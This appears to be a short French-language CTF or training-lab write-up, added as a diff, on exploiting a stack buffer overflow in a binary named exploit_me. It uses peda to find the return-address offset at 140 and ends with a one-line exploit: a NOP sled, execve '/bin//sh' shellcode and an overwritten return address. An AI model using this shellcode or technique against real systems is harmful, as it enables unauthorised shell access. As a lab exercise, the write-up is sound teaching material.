@@ -1,0 +1,16 @@
+On trouve un binaire nomme exploit_me sur la session de zaz
+C'est assez explicite
+Petit desasemblage
+On a juste un main avec un appel a get sur av[1]
+Ok... Simple bufferoverflow:
+Tout d'abord j'installe peda (beaucoup plus lisible)
+peda $> pattern_create 200
+peda $> pset arg AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA (-> retour de l'instruction au dessus)
+peda $> r
+segfault a l'adresse 0x41416d41
+peda $> pattern_offset 0x41416d41 200
+
+On sait maintenant que l'on doit ecraser l'adresse de retour a l'idx 140
+On en executant le main on remarque que notre argument est stocke a l'adresse 0xbffff888, pour etre large on saute un peu plus loin que le debut du buffer (differences entre gdb et la realitee)
+
+$> ./exploit_me `python -c 'print "\x90" * 117 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xa0\xf8\xff\xbf"'`
